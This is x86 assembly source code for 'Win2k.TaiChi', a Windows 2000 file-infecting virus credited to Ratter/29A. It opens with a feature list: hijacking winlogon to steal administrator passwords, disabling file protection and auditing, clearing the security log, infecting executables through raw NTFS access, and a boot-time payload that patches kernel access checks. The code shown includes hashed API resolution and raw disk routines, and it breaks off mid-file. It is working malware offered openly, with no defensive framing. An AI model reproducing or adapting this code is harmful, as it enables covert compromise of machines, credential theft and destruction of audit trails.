; Win2k.TaiChi by Ratter/29A release #1

COMMENT~
This virus has some special features which I would like to list here:
	- getting kenel base from PEB
	- infecting winlogon via which it disables SFP, captures admins
	  passwords and later uses them when logged in as normal user to
	  impersonate admin and working under admin privileges
	- once runned as admin adds needed privileges to Everyone
	- disables auditing, clears security event log
	- uses its own routines for infecting PE exe files on NTFS volumes
	  (ie it accesses NTFS structures to locate and access the file, 
	  bypassing security and via this you can even modify files that are
	  normally unmodifiable)
		- for this it uses emulation of memory mapped files using SEH
		- because a proof of concept virus it infects one file in directory
	- everything prepared for using procedure encryption and running length
	  encryption using SEH (routine seh_decode) however not used in this version
	- it has a payload: installs own bootvid.dll which disables security (via
	  SeAccessCheck patching) via patching the NT kernel runtime and displays
	  29A logo while booting Windows

Todo:
	- emulation engine
	- add procedure encryption and running line encryption
	- more heavily testing under WinXP and possibly adapting
~

        .586p
	.model	flat, stdcall
	locals

	include	useful.inc
	include	win32api.inc
	include	my_macroz.inc
	include	my_include.inc
	include	mz.inc
	include	pe.inc

	virus_size	equ	host_start - taichi_start

        SECURITY_BUILTIN_DOMAIN_RID     equ	20h
	DOMAIN_ALIAS_RID_ADMINS        	equ	220h
	SECURITY_NT_AUTHORITY           equ	5
	POLICY_VIEW_AUDIT_INFORMATION	equ	2
	POLICY_SET_AUDIT_REQUIREMENTS	equ	100h
	POLICY_CREATE_ACCOUNT		equ	10h
	POLICY_LOOKUP_NAMES		equ	800h
	TOKEN_ADJUST_PRIVILEGES		equ	20h
	SE_PRIVILEGE_ENABLED		equ	02h
	USER_PRIV_ADMIN			equ	2
        LOGON32_LOGON_INTERACTIVE	equ	2
	SHREGSET_FORCE_HKLM		equ	8
	MOVEFILE_REPLACE_EXISTING	equ	1
	OF_READ				equ	0000h
	OF_WRITE			equ	0001h
	OF_CREATE			equ	1000h

	PROCESS_CREATE_THREAD		equ	0002h
	PROCESS_VM_OPERATION		equ	0008h
        PROCESS_VM_READ			equ	0010h
	PROCESS_VM_WRITE		equ	0020h
	PROCESS_QUERY_INFORMATION	equ	0400h

	PROCESS_DESIRED_ACCESS	equ	PROCESS_QUERY_INFORMATION or PROCESS_VM_WRITE or \
					PROCESS_VM_OPERATION or PROCESS_CREATE_THREAD or \
					PROCESS_VM_READ

data_section	struc
	harddisk_handle		dd	?
	delta_offset		dd	?
	file_list		dd	?
	fl_mutex		dd	?
	revert_to_self		dd	?
	 
	tVirtualAlloc		dd	?			; api addresses
	tVirtualFree		dd	?
	tVirtualQuery		dd	?
	tCreateFileW		dd	?
	tCloseHandle		dd	?
	tSetFilePointer		dd	?
	tReadFile		dd	?
	tWriteFile		dd	?
	tSleep			dd	?
	tGlobalAlloc		dd	?
	tGlobalFree		dd	?
	tLoadLibraryA		dd	?
	tFreeLibrary		dd	?
	tGetCurrentProcess	dd	?
	tOpenProcess		dd	?
	tReadProcessMemory	dd	?
	tWriteProcessMemory	dd	?
	tVirtualProtect		dd	?
	tCreateMutexA		dd	?
	tReleaseMutex		dd	?
	tWaitForSingleObject	dd	?
	tFindFirstFileW		dd	?
	tFindNextFileW		dd	?
	tFindClose		dd	?
	tGetFullPathNameW	dd	?
	tGetModuleHandleA	dd	?
	tExitThread		dd	?
	tGetLocalTime		dd	?
	tCopyFileA		dd	?
	tMoveFileExA		dd	?
	tCreateFileA		dd	?
	tDeleteFileA		dd	?
	tGetCurrentDirectoryA	dd	?
	tSetCurrentDirectoryA	dd	?
	tExpandEnvironmentStringsA	dd	?
	tCreateRemoteThread	dd	?
	tVirtualAllocEx		dd	?
	tVirtualFreeEx		dd	?

	tCheckTokenMembership	dd	?
	tOpenEventLogA		dd	?
	tCloseEventLog		dd	?
	tClearEventLogA		dd	?
	tLsaOpenPolicy		dd	?
	tLsaQueryInformationPolicy	dd	?
	tLsaSetInformationPolicy	dd	?
	tLsaClose		dd	?
	tLsaFreeMemory		dd	?
	tLookupAccountNameW	dd	?
	tLsaAddAccountRights	dd	?
	tOpenProcessToken	dd	?
	tLookupPrivilegeValueA	dd	?
	tAdjustTokenPrivileges	dd	?
	tRegCreateKeyA		dd	?
	tRegSetValueExA		dd	?
	tRegCloseKey		dd	?
	tRegEnumValueA		dd	?
	tLogonUserA		dd	?
	tImpersonateLoggedOnUser	dd	?
	tRevertToSelf		dd	?

	tEnumProcesses		dd	?
	tEnumProcessModules	dd	?
	tGetModuleBaseNameA	dd	?

	tNetUserGetInfo		dd	?
	tNetApiBufferFree	dd	?

	tSHRegGetUSValueA	dd	?
	tSHRegSetUSValueA	dd	?

	tLZOpenFileA		dd	?
	tLZCopy			dd	?
	tLZClose		dd	?

	tRtlRunDecodeUnicodeString	dd	?
	tLsaLogonUser	dd	?
apiz_size	equ	$-harddisk_handle

boot_sector	equ	$
	        	        db	3 dup(?)
	filesystem		db	8 dup(?)
	bytez_per_sec		dw	?
	sec_per_cluster		db	?
	hsize           	dd	?
				db	6 dup(?)
	secz_per_cyl    	dw	?
				db	22 dup(?)
	mft_lcn			dd	?
	mft_file_recordz_count	dd	?
				db	8 dup(?)
	file_record_size_	dd	?
	bytez_per_cluster	dd	?
	file_record_size	dd	?
	file_record_size_in_secz	dd	?

	buffer_count		db	?
	mft_file_recordz	dd	?
	rootdir_file_record	dd	?

	index_buffer_size	dd	?	; todle uz je [ebp+75h] takze strkat do tex
						; der f boot_sectoru
boot_data_size	equ	(512-($-boot_sector))
				db	boot_data_size dup(?)
data_section	ends

LSA_OBJECT_ATTRIBUTES	struc
	LOA_length	dd	?
	LOA_rootdir	dd	?
	LOA_objectname	dd	?
	LOA_attribz	dd	?
	LOA_sd		dd	?
	LOA_sqos	dd	?
LSA_OBJECT_ATTRIBUTES	ends

TOKEN_PRIVILEGES	struc
	TP_count	dd	?
	TP_luid		dq	?
	TP_attribz	dd	?
TOKEN_PRIVILEGES	ends

FILE	struc
	F_next_file	dd	?
	F_handle	dd	?
	F_size		dd	?
	F_prunlist	dd	?
	F_vmem_start	dd	?
	F_vmem_end	dd	?
	F_dirty_bmask	dd	?
	F_dirty_size	dd	?
FILE	ends

OFSTRUCT	struc
	OF_cBytes	db      ?
	OF_fFixedDisk	db      ?
	OF_nErrCode	dw      ?
	OF_Reserved	dd	?
	OF_szPathName	db      128 dup(?)
OFSTRUCT	ends

; A lil modification of Jacky Qwertys @SEH_SetupFrame
@SEH_SetupFrame_	macro	p1, p2, p3, p4, p5, p6, p7, p8, p9
	local set_new_eh

        call set_new_eh
        irp param, <<&p1>, <&p2>, <&p3>, <&p4>, <&p5>, <&p6>, <&p7>, <&p8>, <&p9>>
		ifb <param>
			exitm
		endif
		param
        endm
set_new_eh:
	xor edx, edx
	push dword ptr fs:[edx]
	mov dword ptr fs:[edx],esp
endm

@unicode_to_asciiz	macro
	lodsw
	stosb
	test eax, eax
	jnz $-5
endm

        .data
	db      ?

        .code

taichi_start	proc	near
	pushad
	@SEH_SetupFrame_ <call seh_decode>, <mov esp,[esp.EH_EstablisherFrame]>, <jmp jmp_to_host>

	mov eax, dword ptr fs:[30h]		; we run on WinNT/2k only boxez
	test eax, eax
	js jmp_to_host

        mov eax, dword ptr [eax+0ch]		; get kernel32 base
        mov esi, dword ptr [eax+1ch]
	lodsd
 	mov ebx, dword ptr [eax+08h]

        @gimme_delta				; get delta offset

	push 0d57d7a0ah				; get GlobalAlloc api
	call gimme_api
	test eax, eax
	jz jmp_to_host

	mov dword ptr [ebp+allocate_mem_fc], eax

	mov eax, type data_section		; allocate needed memory for
	call alloc_mem				; data section
	xchg eax, edx

	call $+5+(api_count*4)
api_crcz	equ	$
	dd	0de1a4c5fh	; VirtualAlloc
	dd	00f3c7b46h	; VirtualFree
	dd	001ea615bh	; VirtualQuery
	dd	0ca098632h	; CreateFileW
	dd	025a15565h	; CloseHandle
	dd	0584e561ch	; SetFilePointer
	dd	04af4dcefh	; ReadFile
	dd	05d2a6f0fh	; WriteFile
	dd	073080607h	; Sleep
	dd	0d57d7a0ah	; GlobalAlloc
	dd	0440f3660h	; GlobalFree
	dd	055cf7e74h	; LoadLibraryA
	dd	0de584a52h	; FreeLibrary
	dd	0f01817e7h	; GetCurrentProcess
	dd	07b47e55dh	; OpenProcess
	dd	094fb613ah	; ReadProcessMemory
	dd	065b96163h	; WriteProcessMemory
	dd	05a040aeah	; VirtualProtect
	dd	0f6e4defeh	; CreateMutexA
	dd	047d713f8h	; ReleaseMutex
	dd	0de578686h	; WaitForSingleObject
	dd	0e2a13a73h	; FindFirstFileW
	dd	098273d7dh	; FindNextFileW
	dd	04c2ea380h	; FindClose
	dd	0691f05ffh	; GetFullPathNameW
	dd	0e21b5ac4h	; GetModuleHandleA
	dd	003e3b53ch	; ExitThread
	dd	0cb735dd6h	; GetLocalTime
	dd	0c16f9286h	; CopyFileA
	dd	0342735e9h	; MoveFileExA
	dd	0bb33a42dh	; CreateFileA
	dd	01cbc6289h	; DeleteFileA
	dd	014cf368dh	; GetCurrentDirectoryA
	dd	0b034481ah	; SetCurrentDirectoryA
	dd	02a21372fh	; ExpandEnvironmentStringsA
	dd	036411aaah	; CreateRemoteThread
	dd	04434b88fh	; VirtualAllocEx        
	dd	0dc421185h	; VirtualFreeEx
api_count	equ	($-api_crcz)/4
        pop esi

	push api_count
	lea edi, [edx+tVirtualAlloc]		; and get needed apiz addresses
	pop ecx
	call gimme_apiz
	test eax, eax
	jz jmp_to_host

	push dword ptr [edx+tGlobalFree]
	pop dword ptr [ebp+free_mem_fc]

	call extended_import_end
extended_import	equ	$
        db	"advapi32.dll", 0
	dd	?
	db	advapi_api_count
advapi_import_start	equ	$
	dd	0b63cdc69h	; CheckTokenMembership
	dd	02a245267h	; OpenEventLogA
	dd	017bfd125h	; CloseEventLog
	dd	0b85bde9ah	; ClearEventLogA
	dd	00a29176bh	; LsaOpenPolicy
	dd	0ba0d41e2h	; LsaQueryInformationPolicy
	dd	0052d2c17h	; LsaSetInformationPolicy
	dd	03a7a8abbh	; LsaClose
	dd	066ef11cdh	; LsaFreeMemory
	dd	0eb858298h	; LookupAccountNameW
        dd	0779ecc40h	; LsaAddAccountRights
	dd	002293b95h	; OpenProcessToken
	dd	0c73295b1h	; LookupPrivilegeValueA
	dd	031879e8ch	; AdjustTokenPrivileges
        dd	06dce4759h	; RegCreateKeyA
	dd	0437e36a1h	; RegSetValueExA
	dd	0d0ac931eh	; RegCloseKey
	dd	0c7cca16ah	; RegEnumValueA
	dd	04512115ah	; LogonUserA
	dd	0983f59dbh	; ImpersonateLoggedOnUser
	dd	0205b6ed3h	; RevertToSelf
advapi_api_count	equ	($-advapi_import_start)/4

	db	"psapi.dll", 0
	dd	?
	db	psapi_api_count
psapi_import_start	equ	$
	dd	06bc1778ah	; EnumProcesses
	dd	0c7eb0daah	; EnumProcessModules
	dd	0f5b152e4h	; GetModuleBaseNameA
psapi_api_count	equ	($-psapi_import_start)/4

        db	"netapi32.dll", 0
	dd	?
	db	netapi32_api_count
netapi32_import_start	equ	$
	dd	0b5c24d82h	; NetUserGetInfo
	dd	0cc33532bh	; NetApiBufferFree
netapi32_api_count	equ	($-netapi32_import_start)/4

	db	"shlwapi.dll", 0
	dd	?
	db	shlwapi_api_count
shlwapi_import_start	equ	$
	dd	07a9ee238h	; SHRegGetUSValueA
	dd	094b2dea3h	; SHRegSetUSValueA
shlwapi_api_count	equ	($-shlwapi_import_start)/4

	db	"lz32.dll", 0
	dd	?
	db	lz32_api_count
lz32_import_start	equ	$
	dd	0d0a03733h	; LZOpenFileA
	dd	05064897fh	; LZCopy
	dd	0605319d6h	; LZClose
lz32_api_count		equ	($-lz32_import_start)/4

	db	"ntdll.dll", 0
	dd	?
	db	1
	dd	0cb34bfcdh	; RtlRunDecodeUnicodeString

	db	"secur32.dll", 0
	dd	?
	db	1
	dd	04751e365h	; LsaLogonUser
        db	-1

	db	0, "[Win2k.TaiChi] by Ratter/29A", 0
	db	"Dedicated to Bara&Misza. Live your fuckin lifes; listen to fuckin liez. "
	db	"I'll exist from day to day coz I'm too weird to live but too rare to die", 0
extended_import_end:
	pop esi

        lea edi, [edx+tCheckTokenMembership]

	mov dword ptr [ebp+data_section_mem], edx
	mov dword ptr [edx+delta_offset], ebp
        mov ebp, edx

	call gimme_apiz_extended
	xchg eax, ecx
	jecxz release_resourcez

	call infect_winlogon
	call gain_admin

	xor eax, eax
	push eax
	push eax
	push eax
        call dword ptr [ebp+tCreateMutexA]
        xchg eax, ecx
        jecxz release_resourcez
        mov dword ptr [ebp+fl_mutex], ecx

	call ntfs_init
        jc release_resourcez

        call main_infection_routine

	call ntfs_deinit

	call deallocate_bufferz_mem
release_resourcez:
        mov ecx, dword ptr [ebp+revert_to_self]
        jecxz free_mutex
        call dword ptr [ebp+tRevertToSelf]
free_mutex:
	mov ecx, dword ptr [ebp+fl_mutex]
        jecxz free_librariez_mem
        push ecx
        call dword ptr [ebp+tCloseHandle]	
free_librariez_mem:
        mov eax, dword ptr [ebp+delta_offset]
	lea esi, [eax+extended_import]
	call free_librariez

	push ebp
	call free_mem
jmp_to_host:
	@SEH_RemoveFrame
	popad

        mov eax, offset host_start
victim_entrypoint	equ	$-4
	jmp eax

taichi_start	endp

gimme_apiz	proc	near
	push dword ptr [esi]
	call gimme_api
	test eax, eax
	jz gimme_apiz_end
	stosd
	add esi, 4
	loop gimme_apiz
gimme_apiz_end:
	retn
gimme_apiz	endp

; in: [esp+4] - api CRC32
;     ebx - dll base
; out: eax - api address or null if error
gimme_api	proc	near
	xor eax, eax
	pushad
	@SEH_SetupFrame <jmp gimme_api_end+3>

	mov eax, dword ptr [ebx.MZ_lfanew]
	add eax, ebx
	mov ecx, dword ptr [eax.NT_OptionalHeader.OH_DirectoryEntries.\
					DE_Export.DD_VirtualAddress]
	jecxz gimme_api_end+3

        xchg ecx, edx
	add edx, ebx

	push edx
	push dword ptr [edx.ED_NumberOfNames]

	mov edi, dword ptr [edx.ED_AddressOfNames]
	add edi, ebx
	xor ecx, ecx

gimme_api_next_api:
	mov esi, dword ptr [edi+ecx*4]
	add esi, ebx
	push 0
	call gimme_CRC32

	cmp eax, dword ptr [esp+cPushad+12+8]
	jnz gimme_api_go_on

	mov edx, dword ptr [esp+4]
	mov eax, dword ptr [edx.ED_AddressOfOrdinals]
	add eax, ebx

	push ecx
	movzx ecx, word ptr [eax+ecx*2]

	mov eax, dword ptr [edx.ED_AddressOfFunctions]
	add eax, ebx

	mov eax, dword ptr [eax+ecx*4]
	pop ecx

	add eax, ebx

	mov dword ptr [esp+8+8+Pushad_eax], eax
	jmp gimme_api_end

gimme_api_go_on:
	inc ecx
	cmp ecx, dword ptr [esp]
	jc gimme_api_next_api

gimme_api_end:
	add esp, 8
	@SEH_RemoveFrame
	popad
	retn 4
gimme_api	endp
	
; in: esi - string to make CRC32
;     [esp+4] - length of string or null if ASCIIZ_string
; out: eax - CRC32
gimme_CRC32	proc	near
	pushad
	xor edx, edx
	mov eax, edx
gimme_CRC32_all_iz_ok:
	mov ecx, dword ptr [esp.cPushad+4]
	jecxz gimme_CRC32_asciiz_string
gimme_CRC32_main_loop:
	lodsb
	cmp al, 'a'
	jc gimme_CRC32_big
	cmp al, 'z'
	ja gimme_CRC32_big
	add al, 'A'-'a'
gimme_CRC32_big:
	xor ah, al
	rol eax, 8
	xor eax, edx
	not edx
	mov bl, 32
gimme_CRC32_next:
	rol eax, 1
	xor edx, 05f6abcd8h
	xor eax, 0a6dfe9ffh
	ror edx, 1
	add eax, edx
	xor edx, 08ad6fe7h
	dec bl
	jnz gimme_CRC32_next
	xor eax, edx
	dec ecx
	jnz gimme_CRC32_main_loop
	mov dword ptr [esp.Pushad_eax], eax
	popad
	retn 4
gimme_CRC32_asciiz_string:
	mov edi, esi
	push esi
	inc edi
	@endsz
	sub esi, edi
	mov dword ptr [esp.cPushad+8], esi
	pop esi
	jmp gimme_CRC32_all_iz_ok
gimme_CRC32	endp

alloc_mem	proc	near
	pushad	
	push eax
	push GMEM_ZEROINIT
	call $+9
allocate_mem_fc	dd	?	
	pop eax
	call dword ptr [eax]
	mov dword ptr [esp.Pushad_eax], eax
	popad
        retn
alloc_mem	endp

; in: [esp+4] - ptr to mem to free
free_mem	proc	near
        pushad
        push dword ptr [esp+cPushad+4]
	call $+9
free_mem_fc	dd	?
	pop eax
	call dword ptr [eax]
	popad
	retn 4
free_mem	endp

gimme_data_section_ptr	proc	near
	call $+9
data_section_mem	dd	?
	pop eax
	mov eax, dword ptr [eax]
	retn
gimme_data_section_ptr	endp

; in: esi - extended_import_struc
;     edi - where to store api addressez
; out: eax - null if error
gimme_apiz_extended	proc	near
	pushad
	@SEH_SetupFrame <jmp gimme_apiz_extended_end>

gimme_apiz_extended_loop:
        cmp byte ptr [esi], -1
	jz gimme_apiz_extended_end

	push esi
	call dword ptr [ebp+tLoadLibraryA]
	test eax, eax
	jz gimme_apiz_extended_end

	mov ebx, eax

	push eax
	@endsz
	pop dword ptr [esi]
	add esi, 4

	xor eax, eax
	lodsb
	xchg eax, ecx
gimme_apiz_extended_sub_loop:
	lodsd

        push eax
	call gimme_api
	test eax, eax
	jz gimme_apiz_extended_end

	stosd
	loop gimme_apiz_extended_sub_loop
	jmp gimme_apiz_extended_loop
gimme_apiz_extended_end:
	@SEH_RemoveFrame
	mov dword ptr [esp.Pushad_eax], eax
	popad
	retn
gimme_apiz_extended	endp

; in: esi - extended librariez_struc
free_librariez	proc	near
	pushad
	@SEH_SetupFrame <jmp free_librariez_end>

free_librariez_loop:
        cmp byte ptr [esi], -1
	jz free_librariez_end

	@endsz
	lodsd

	push eax
	call dword ptr [ebp+tFreeLibrary]

	lodsb
	lea esi, [esi+eax*4]
	jmp free_librariez_loop

free_librariez_end:
	@SEH_RemoveFrame
	popad
	retn
free_librariez	endp

ntfs_init	proc	near
	pushad
	@SEH_SetupFrame <jmp ntfs_init_end_error>

	xor eax, eax
	push eax
	push eax
	push OPEN_EXISTING			; open the current volume
	push eax				; for read/write
	push FILE_SHARE_READ or FILE_SHARE_WRITE
	push GENERIC_READ or GENERIC_WRITE
	call $+19
		dw	"\", "\", ".", "\", "x", ":", 0
	pop edx
	call get_current_drive
	mov word ptr [edx+8], ax
	push edx
	call dword ptr [ebp+tCreateFileW]
	test eax, eax
	jz ntfs_init_end_error

	mov dword ptr [ebp+harddisk_handle], eax

        lea ebx, [ebp+boot_sector]
	xor edx, edx
	xor esi, esi
	mov word ptr [ebp+bytez_per_sec], 512	; read the boot sector
	inc esi
	xor ecx, ecx
	call readwrite_sectorz

	push 8
        @pushsz "NTFS    "
        pop esi
        lea edi, [ebp+filesystem]		; check whether it is NTFS
        pop ecx
        rep cmpsb
        jnz ntfs_init_end_error_close 

	movzx eax, word ptr [ebp+bytez_per_sec]
	movzx ebx, byte ptr [ebp+sec_per_cluster]
	mul ebx
	mov [ebp+bytez_per_cluster], eax

	cmp eax, 4096				; check cluster_size==iapx86_page_size
	jnz ntfs_init_end_error_close 		; ntfs_volumez>2048 megz have cluster_size==iapx86_page_size==4096

	mov ecx, [ebp+file_record_size_]
	test cl, cl
	jns $+11
	neg cl
	push 1
	pop eax
	shl eax, cl				; setup some needed
	jmp ntfs_init_next			; variables

	mov eax, [ebp+bytez_per_cluster]
	mul ecx
ntfs_init_next:
	mov [ebp+file_record_size], eax

	movzx ebx, word ptr [ebp+bytez_per_sec]
	xor edx, edx
	div ebx
	mov [ebp+file_record_size_in_secz], eax

	; now read the $MFT file record
	mov eax, dword ptr [ebp+file_record_size]
	imul eax, eax, 100
        call alloc_mem				; alloc mem for $MFT file recordz
	mov dword ptr [ebp+mft_file_recordz], eax
	inc dword ptr [ebp+mft_file_recordz_count]
	xchg eax, ebx

        mov byte ptr [ebp+buffer_count], 1

	mov eax, dword ptr [ebp+mft_lcn]
	movzx ecx, byte ptr [ebp+sec_per_cluster]
	mul ecx
	xchg eax, edx

	mov esi, dword ptr [ebp+file_record_size_in_secz]
	xor ecx, ecx
	call readwrite_sectorz			; read the $MFT file record

	xchg eax, ebx
	push 20h
	pop ebx					; is $ATTRIB list present?
	cdq
	call find_attrib
	xchg eax, ecx
	jecxz mft_without_attrib_list

	pushad
	mov edi, dword ptr [ebp+mft_file_recordz]
	add edi, dword ptr [ebp+file_record_size]

        mov ebx, ecx
	call read_specific_value_part
	xchg eax, ebx

	push ebx
mft_data_attribz_loop:
	cmp dword ptr [ebx], 80h
	jz mft_got_data_attrib
        movzx eax, word ptr [ebx+4]
	add ebx, eax
	jmp mft_data_attribz_loop

mft_we_have_more_data_attribz:
	mov eax, dword ptr [ebx+10h]
	call read_file_record

	mov esi, eax
	mov ecx, dword ptr [ebp+file_record_size]
	shr ecx, 2
	rep movsd

	inc dword ptr [ebp+mft_file_recordz_count]

	push eax
	call free_mem

mft_got_data_attrib:
	movzx eax, word ptr [ebx+4]
	add ebx, eax
	cmp dword ptr [ebx], 80h
	jz mft_we_have_more_data_attribz

        call free_mem
        popad

mft_without_attrib_list:
        push 5
        pop eax					; read the root directory file record
        call read_file_record
        jc ntfs_free_mft_mem

	mov dword ptr [ebp+rootdir_file_record], eax
	inc byte ptr [ebp+buffer_count]

	mov ebx, 90h
	call find_attrib_directory

	lea edx, [eax+14h]
	movzx ecx, word ptr [edx]
	add eax, ecx

	mov eax, dword ptr [eax+0ch]
	movzx ecx, word ptr [ebp+bytez_per_cluster]
	mul ecx

	mov dword ptr [ebp+index_buffer_size], eax
        clc
	jmp ntfs_init_end_error+1

ntfs_free_mft_mem:
	call deallocate_bufferz_mem
ntfs_init_end_error_close:
	call ntfs_deinit
ntfs_init_end_error:
	stc
	lahf
	@SEH_RemoveFrame
	sahf
	popad
	retn
ntfs_init	endp

get_current_drive	proc	near
	mov eax, dword ptr fs:[30h]	; goto PEB
	mov eax, dword ptr [eax+10h]	; goto user_process_paramz
	add eax, 24h			; goto curdir_unicode_string
	mov eax, dword ptr [eax+4]	; gimme unicode_buffer
	movzx eax, byte ptr [eax]
	retn
get_current_drive	endp

ntfs_deinit	proc	near
	push dword ptr [ebp+harddisk_handle]
	call dword ptr [ebp+tCloseHandle]
	retn
ntfs_deinit	endp

; in: ebx - buffer
;     ecx - 0 if read
;           1 if write
;     edx - starting sector
;     esi - sectorz 2 read
readwrite_sectorz	proc	near
	pushad

        call $+7
	dw	0
	pop edi

        bt word ptr [edi], 0
        jnc $+11

        pushad
        push 1
        call dword ptr [ebp+tSleep]
        popad
        jmp $-14

        bts word ptr [edi], 0
        jc $-20
	
	push edi

	mov edi, dword ptr [ebp+harddisk_handle]

        push ecx

	xchg eax, edx
	movzx ecx, word ptr [ebp+bytez_per_sec]
	push ecx
	mul ecx
	mov dword ptr [ebp+hsize], edx
	
	lea edx, [ebp+hsize]
	push 0
	push edx
	push eax
	push edi
	call dword ptr [ebp+tSetFilePointer]

	xchg eax, esi
	pop ecx
        mul ecx
	
	pop ecx

	xor edx, edx
	push edx
        @pushvar <dd	?>
        push eax
	push ebx
	push edi
	jecxz $+7
        call dword ptr [ebp+tWriteFile]
	jmp $+5
        call dword ptr [ebp+tReadFile]

        pop edi
        dec word ptr [edi]

        popad
	retn
readwrite_sectorz	endp

; in: eax - *FILE record
;     ebx - attribute type
;     ecx - size of the name (if null no checking done)
;     edx - name
; out: ecx - size of the name
;      eax - *attrib header
find_attrib	proc	near
	pushad
	push ecx
	movzx ecx, word ptr [eax+14h]
	add eax, ecx
	pop ecx	
find_attrib_loop:
	cmp dword ptr [eax], 0FFFFFFFFh
	jz find_attrib_end
	cmp dword ptr [eax], ebx
	jnz find_attrib_next_attrib
	test ecx, ecx
	jnz find_attrib_name_check
	cmp byte ptr [eax+9], 0
	jnz find_attrib_next_attrib
	jmp find_attrib_end+2

find_attrib_name_check:
	cmp cl, byte ptr [eax+9]
	jnz find_attrib_next_attrib
	mov esi, eax
	push ecx
	movzx ecx, word ptr [eax+0ah]
	add esi, ecx
	pop ecx
	call uppercase_unicode
	push ecx
	mov edi, edx
	repz cmpsw
	pop ecx
	jz find_attrib_end+2

find_attrib_next_attrib:
	cmp dword ptr [eax+4], 0
	jz find_attrib_end
	add eax, dword ptr [eax+4]
	jmp find_attrib_loop
find_attrib_end:
	xor eax, eax
	mov dword ptr [esp.Pushad_eax], eax
        popad
	retn
find_attrib	endp

; in: ecx - attribute
;     eax - file record
; out: eax - file record that contains the attribute
find_attrib_in_attrib_list	proc	near
        pushad

        xor edi, edi

        push ecx
	mov ebx, 20h
	xor ecx, ecx
	xor edx, edx
	call find_attrib
	xchg eax, ecx
        jecxz find_attrib_in_attrib_list_end_error

	mov ebx, ecx
        call read_specific_value_part
        mov edi, eax
        mov ebx, eax
	pop ecx

find_attrib_in_attrib_list_loop:
	cmp [ebx], ecx
	je find_attrib_in_attrib_list_ok_found
	cmp dword ptr [ebx], 0FFFFFFFFh
	je find_attrib_in_attrib_list_end_error+1
	cmp word ptr [ebx+4], 0
	je find_attrib_in_attrib_list_end_error+1

	movzx eax, word ptr [ebx+4]
	add ebx, eax
	jmp find_attrib_in_attrib_list_loop

find_attrib_in_attrib_list_ok_found:
	mov eax, [ebx+10h]
	jmp $+5

find_attrib_in_attrib_list_end_error:
	pop ecx
	xor eax, eax

        test edi, edi
	jz $+8

        push edi
	call free_mem

	mov dword ptr [esp.Pushad_eax], eax
	popad
	retn
find_attrib_in_attrib_list	endp

; This uppercases an UNICODE string
; in: esi - string
;     ecx - size
uppercase_unicode	proc	near
	or ecx, ecx
	jnz uppercase_unicode_go_on
	retn
uppercase_unicode_go_on:
	push ecx
	push esi

uppercase_unicode_loop:
	cmp word ptr [esi], 61h
	jc uppercase_unicode_next
	cmp word ptr [esi], 7Ah
	ja uppercase_unicode_next
	sub word ptr [esi], 20h
uppercase_unicode_next:
	add esi, 2
	loop uppercase_unicode_loop

	pop esi
	pop ecx
	retn
uppercase_unicode	endp

deallocate_bufferz_mem	proc	near
	lea esi, [ebp+mft_file_recordz]
	movzx ecx, byte ptr [ebp+buffer_count]
deallocate_bufferz_mem_loop:
	push dword ptr [esi]
	call free_mem
	add esi, 4
	loop deallocate_bufferz_mem_loop
	retn
deallocate_bufferz_mem	endp

; in: eax - file record number
; out: eax - buffer where is the File record
;      CFlag - indicates an error
read_file_record	proc	near
	pushad

	push eax
        mov eax, dword ptr [ebp+file_record_size]
        call alloc_mem
	xchg eax, edi
	pop eax

	mov dword ptr [esp.Pushad_eax], edi

	mul [ebp+file_record_size_in_secz]
	mov ecx, [ebp+file_record_size_in_secz]

read_file_record_loop:
	push eax
	push ecx

	xor edx, edx
	movzx ebx, byte ptr [ebp+sec_per_cluster]
	div ebx

	push edx
	push edi
	call mft_vcn_to_lcn
	pop edi
	test eax, eax
	jz read_file_record_error_pop

	movzx ebx, byte ptr [ebp+sec_per_cluster]
	mul ebx
	pop edx

        add edx, eax
	pop ecx

	movzx ebx, byte ptr [ebp+sec_per_cluster]

        cmp ecx, ebx
	jbe read_file_record_next

	mov esi, ebx
	sub ecx, ebx
	pop eax
	add eax, ebx

	push eax
	push ecx
	jmp short read_file_record_read
read_file_record_next:
	pop eax
	add eax, ecx
	push eax
	mov esi, ecx
	xor ecx, ecx
	push ecx
read_file_record_read:
	push edi
	mov ebx, edi
	xor ecx, ecx
	call readwrite_sectorz
	pop edi

	add edi, [ebp+bytez_per_cluster]
	pop ecx
	pop eax
	
	jecxz $+4
	jmp read_file_record_loop

	clc
	jmp read_file_record_end+1
read_file_record_error_pop:
	add esp, 12
read_file_record_error:
	push edi
	call free_mem
read_file_record_end:
	stc
	popad
	retn
read_file_record	endp

; in: eax - VCN
; out: eax - LCN
mft_vcn_to_lcn	proc	near
	pushad

	mov edi, dword ptr [ebp+mft_file_recordz]
	mov ecx, dword ptr [ebp+mft_file_recordz_count]
mft_vcn_to_lcn_loop:
        push ecx

        mov eax, edi
	push 80h
	pop ebx
	xor ecx, ecx
	cdq
	call find_attrib

	mov ebx, eax
	mov eax, dword ptr [esp+4+Pushad_eax]
	call process_runlist
	pop ecx
	test eax, eax
	jnz mft_vcn_to_lcn_end

	add edi, dword ptr [ebp+file_record_size]
	loop mft_vcn_to_lcn_loop

mft_vcn_to_lcn_end:
	mov dword ptr [esp.Pushad_eax], eax
	popad
	retn
mft_vcn_to_lcn	endp

; in: eax - VCN
;     ebx - *attribute header
; out: ecx - how much clusters to the end of run
;      eax - LCN associated to the VCN
process_runlist	proc	near
	cmp byte ptr [ebx+8], 1
	jnz process_runlist_end_error

	lea esi, dword ptr [ebx+10h]
	mov edx, dword ptr [esi+8]

	cmp eax, edx
	ja process_runlist_end_error

        mov edx, [esi]
	cmp eax, edx
	jc process_runlist_end_error

	push eax
	movzx eax, word ptr [esi+10h]
	add ebx, eax
	xor esi, esi
	pop eax

process_runlist_loop:
	cmp byte ptr [ebx], 0
	jz process_runlist_end_error

	call get_run_lcn
	add esi, ecx

	call get_run_length
	add ecx, edx

	cmp eax, ecx
	jc process_runlist_end

	mov edx, ecx
	push eax

        movzx ecx, byte ptr [ebx]
	mov eax, ecx
	and eax, 0Fh
	shr ecx, 4
	add ebx, ecx
	add ebx, eax
	inc ebx

	pop eax
	jmp process_runlist_loop
process_runlist_end:
	sub ecx, eax
	sub eax, edx
	add eax, esi
	retn
process_runlist_end_error:
	xor eax, eax
	retn
process_runlist	endp

; in: ebx - *run
; out: ecx - size in clusterz
get_run_length	proc	near
	mov cl, [ebx]
	and ecx, 0Fh

	jecxz get_run_length_error

	push ebx
	push edx
	add ebx, ecx
	movsx edx, byte ptr [ebx]
	dec ecx
	dec ebx
get_run_length_loop:
        jecxz get_run_length_end

	shl edx, 8
	mov dl, [ebx]
	dec ebx
	dec ecx
	jmp get_run_length_loop
get_run_length_end:
	mov ecx, edx
	pop edx
       	pop ebx

get_run_length_error:
	retn
get_run_length	endp

; in: ebx - *run
